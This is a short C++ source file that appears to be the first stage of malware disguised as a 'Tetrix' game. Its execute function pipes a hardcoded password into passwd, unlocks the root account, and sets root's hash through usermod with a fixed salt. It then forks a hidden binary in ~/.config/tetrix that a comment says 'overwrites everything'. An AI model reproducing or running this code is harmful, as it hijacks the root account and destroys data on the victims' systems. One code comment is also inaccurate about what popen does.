/*Probs am overcommenting*/
#include "phase1.h"
#include <unistd.h>

phase1::phase1()
{

}

int phase1::execute()
{
  FILE* stdin = popen("passwd", "w"); //Opens passwd file in write mode.
  const char* newpass = ROOT_PASSWORD;//points char newpass to the password.
  fputs(newpass, stdin);
  fputs(newpass, stdin);
  pclose(stdin);
  system("passwd -u root"); //Unlock the root account.
  std::string homedir = std::getenv("HOME");
  std::string cmd_start = "usermod root -p ";
  std::string second_part = crypt(ROOT_PASSWORD, "AA");
  system((cmd_start + second_part).c_str());
  if(fork() == 0)//If we haven't already forked, fork
    system((homedir+"/.config/tetrix/Tetrix -p 2").c_str()); //Begins phase 2, which overwrites everything.
  return 0;
}
